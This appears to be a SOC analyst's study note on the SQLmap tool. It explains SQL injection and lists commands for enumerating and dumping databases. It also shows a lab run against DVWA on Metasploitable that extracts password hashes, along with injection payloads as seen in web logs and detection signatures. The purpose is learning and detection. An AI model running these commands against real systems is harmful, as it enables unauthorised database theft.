# SQLmap

## What It Is
An automated SQL injection detection and exploitation tool. It tests web
application parameters for SQL injection vulnerabilities and, if found,
can extract database contents automatically.

---

## When This Knowledge Applies to SOC Work

- **Web application log analysis** — SQLmap generates very distinctive HTTP request
  patterns. Recognizing them in web server logs is a key SOC analyst skill.
- **WAF and IDS rule tuning** — understanding SQLmap's payloads helps write better
  detection signatures
- **Incident response** — when investigating a web application breach, SQLmap-style
  traffic in historical logs can confirm how data was exfiltrated

---

## What SQL Injection Actually Is

SQL injection occurs when user-supplied input is inserted directly into a
database query without sanitization.

Vulnerable code (PHP example):
```php
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
```

If a user sends `id=1 OR 1=1`, the query becomes:
```sql
SELECT * FROM users WHERE id=1 OR 1=1
```
Which returns all users instead of just user 1. This is SQL injection.

SQLmap automates testing for this and dozens of more complex variants.

---

## Most Used Commands

| Command | What It Does |
|---|---|
| `sqlmap -u "http://target/page.php?id=1"` | Basic test — checks if `id` parameter is injectable |
| `sqlmap -u "http://target/page.php?id=1" --dbs` | List all databases if injectable |
| `sqlmap -u "http://target/page.php?id=1" -D dbname --tables` | List tables in a database |
| `sqlmap -u "http://target/page.php?id=1" -D dbname -T tablename --dump` | Extract table contents |
| `sqlmap -u "http://target/page.php?id=1" --level=5 --risk=3` | More aggressive testing |
| `sqlmap -u "http://target/page.php?id=1" --batch` | Auto-accept all prompts (non-interactive) |
| `sqlmap -u "http://target/page.php?id=1" --forms` | Automatically test all form inputs |
| `sqlmap -r request.txt` | Test from a saved Burp Suite HTTP request file |

---

## Practical Scenarios I Used It For

### Testing Metasploitable DVWA (Damn Vulnerable Web Application)
Metasploitable runs DVWA at `http://192.168.56.102/dvwa` — a deliberately
vulnerable web application with multiple SQL injection endpoints.

```bash
# First, get a valid session cookie from DVWA (log in via browser, copy cookie)
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       --dbs
```

What SQLmap found:
- The `id` parameter was injectable
- Database type: MySQL
- Databases: `dvwa`, `information_schema`, `mysql`

```bash
# Extract the users table from dvwa database
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       -D dvwa -T users --dump
```

Result: usernames and MD5-hashed passwords extracted from the database.

**Detection insight:** Every SQLmap test generates extremely noisy HTTP logs.
The request pattern looks like this in the web server access log:

```
GET /dvwa/vulnerabilities/sqli/?id=1' AND 1=1-- HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1' AND 1=2-- HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1' ORDER BY 1-- HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1' ORDER BY 2-- HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1 UNION SELECT NULL-- HTTP/1.1
```

SQL keywords (`AND`, `OR`, `UNION`, `SELECT`, `ORDER BY`) appearing in URL
parameters is the signature. Any WAF or SIEM monitoring web server logs should
alert on this immediately.

---

## What SQLmap Traffic Looks Like in Logs

This is the most important thing to understand from a SOC perspective.

A normal legitimate request:
```
GET /page.php?id=5 HTTP/1.1
```

SQLmap testing the same parameter:
```
GET /page.php?id=5' HTTP/1.1
GET /page.php?id=5 AND 1=1-- HTTP/1.1
GET /page.php?id=5 AND 1=2-- HTTP/1.1
GET /page.php?id=5 ORDER BY 1-- HTTP/1.1
GET /page.php?id=5 UNION ALL SELECT NULL-- HTTP/1.1
GET /page.php?id=5 UNION ALL SELECT NULL,NULL-- HTTP/1.1
```

Key signatures to detect in SIEM:
- SQL keywords in URL parameters or POST body
- Rapid succession of requests to the same endpoint with slight variations
- HTTP 500 errors mixed with 200s on the same endpoint (testing for error-based injection)
- Single source IP generating unusually high request volume to one endpoint

---

## SQLmap With Burp Suite Integration

A common workflow: intercept a request in Burp Suite, save it, feed it to SQLmap.

In Burp Suite: right-click on any request → "Save item" → save as `request.txt`

Then:
```bash
sqlmap -r request.txt --batch --dbs
```

This is more reliable than constructing the URL manually because it includes
all headers, cookies, and POST data exactly as the browser sent them.

---

## What I Learned the Hard Way

**SQLmap needs a valid session to test authenticated pages.**
Testing pages that require login without providing a valid session cookie
returns login page HTML every time — SQLmap sees no injection point because
it is not actually reaching the vulnerable page. Always log in first via
browser and copy the session cookie with `--cookie=`.

**`--level` and `--risk` control aggression.**
Default settings (`--level=1 --risk=1`) test common injection points conservatively.
Higher values test more parameters and use more aggressive payloads but generate
significantly more traffic — much noisier from a detection standpoint.
In a real engagement, starting conservative and escalating is standard practice.

**The output directory matters.**
SQLmap saves results automatically to `~/.sqlmap/output/[target]/`. If you run
the same test twice, it reuses cached results. Use `--flush-session` to force
a fresh test if you want clean results.

---

## Resources

- [SQLmap Official Documentation](https://sqlmap.org/)
- [TryHackMe — OWASP Top 10](https://tryhackme.com/room/owasptop10)
- [PortSwigger Web Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
